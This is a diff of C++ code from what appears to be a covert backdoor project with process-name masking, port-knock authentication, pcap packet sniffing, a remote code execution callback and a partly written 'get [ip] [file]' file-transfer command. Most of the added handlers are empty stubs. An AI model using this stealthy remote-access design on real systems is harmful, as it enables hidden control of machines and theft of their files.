@@ -85,7 +85,6 @@ void testRceRes(const Properties &p) {
 
 // TODO: Remove
 void testFileMonitor() {
-
     EventCallback created = [=](const FileMonitor *fm, struct inotify_event *e) {
         std::cout << "created" << std::endl;
         std::cout << "name: " << e->name << std::endl;
@@ -188,7 +187,7 @@ Properties getConfig(const std::string &filename) {
  * Changes the name of the process to the mask.
  *
  * Params:
- *      char *original: Argv[0]
+ *      char *original: argv[0]
  *
  *      const char *mask: The new name use.
  *
@@ -243,11 +242,51 @@ int clientMode(const Properties &p, char *programName) {
     unsigned short knockPort = std::stoi(p.at("knockPort"));
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
+    EventCallback created = [=](const FileMonitor *fm, struct inotify_event *e) {
+
+    };
+
+    EventCallback modified = [=](const FileMonitor *fm, struct inotify_event *e) {
+
+    };
+
+    EventCallback deleted = [=](const FileMonitor *fm, struct inotify_event *e) {
+
+    };
+
+    FileMonitor fm(created, modified, deleted);
+
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
 
     // adding all the required callback functions
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
+    netEngine.LoopCallbacks.push_back(
+        [=](const pcap_pkthdr *header, const unsigned char *packet, NetworkEngine *net) {
+            // is it from same machine?
+            if (net->isFromThisMachine(eth)) {
+                return;
+            }
 
+            // is it ip?
+            if (!net->isIp(eth)) {
+                return;
+            }
+
+            // is it tcp?
+            ip = (struct iphdr *)(packet + ETH_HLEN);
+            if (!net->isTcp(ip)) {
+                return;
+            }
+
+            tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));
+
+            // is it authenticated?
+            if (!net->isAuth(tcp)) {
+                return;
+            }
+        });
+
+    fm.startMonitoring();
     netEngine.startSyncSniff("ip");
 
     return 0;
@@ -320,6 +359,21 @@ int serverMode(const Properties &p) {
 
         // format: get [ip] [file]
         if (tokens[0] == "get") {
+            if (tokens.size() < 2) {
+                std::cerr << "server: Not enough arguments" << std::endl;
+                break;
+            }
+
+            // convert and check ip
+            if (!inet_aton(tokens[1].c_str(), &daddr)) {
+                std::cerr << "server: Invalid destination host" << std::endl;
+                break;
+            }
+            daddr.s_addr = ntohl(daddr.s_addr);
+
+            // send get command
+
+            // start tcp server
         }
 
         sleep(1);
